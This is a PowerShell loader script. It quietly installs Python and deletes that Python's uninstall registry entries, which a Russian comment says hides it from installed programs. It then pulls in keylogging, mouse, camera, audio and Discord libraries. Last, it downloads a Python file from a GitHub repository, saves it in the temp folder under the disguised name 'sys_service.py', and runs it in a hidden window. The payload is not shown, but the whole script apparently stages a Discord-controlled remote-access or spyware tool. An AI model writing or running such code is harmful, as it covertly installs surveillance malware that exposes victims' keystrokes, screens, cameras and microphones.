$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = 'SilentlyContinue'

$pyPath = "$env:LOCALAPPDATA\Programs\Python\Python311\python.exe"

if (-not (Test-Path $pyPath)) {
    Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.11.9/python-3.11.9-amd64.exe" -OutFile "$env:TEMP\py_setup.exe"
    Start-Process -FilePath "$env:TEMP\py_setup.exe" -ArgumentList "/quiet InstallAllUsers=0 PrependPath=1 Include_test=0 Include_launcher=0 AssociateFiles=0 Shortcuts=0" -Wait
    Remove-Item "$env:TEMP\py_setup.exe" -Force

    $junkFolder = "$env:USERPROFILE\Desktop\параметры"
    if (Test-Path $junkFolder) { Remove-Item $junkFolder -Recurse -Force }

    # скрыть Python из списка установленных программ
    $uninstallBase = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall"
    Get-ChildItem $uninstallBase | Where-Object {
        $_.GetValue("DisplayName") -like "*Python*"
    } | Remove-Item -Recurse -Force

    $uninstallBase2 = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall"
    Get-ChildItem $uninstallBase2 | Where-Object {
        $_.GetValue("DisplayName") -like "*Python*"
    } | Remove-Item -Recurse -Force

    $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")
    if (-not (Test-Path $pyPath)) { $pyPath = "python.exe" }
}

$deps = @(
    "discord.py", "keyboard", "mouse", "psutil", "pyttsx3",
    "requests", "pywin32", "pycryptodome", "Pillow", "comtypes",
    "pycaw", "opencv-python", "pyaudio"
)

& $pyPath -m pip install --upgrade pip -q
& $pyPath -m pip install @deps -q

$repoUrl = "https://github.com/ht-at/DOTAMOD/raw/refs/heads/main/DOTA.py"
$botPath = "$env:TEMP\sys_service.py"

Invoke-WebRequest -Uri $repoUrl -OutFile $botPath
Start-Process -FilePath $pyPath -ArgumentList "-W ignore `"$botPath`"" -WindowStyle Hidden
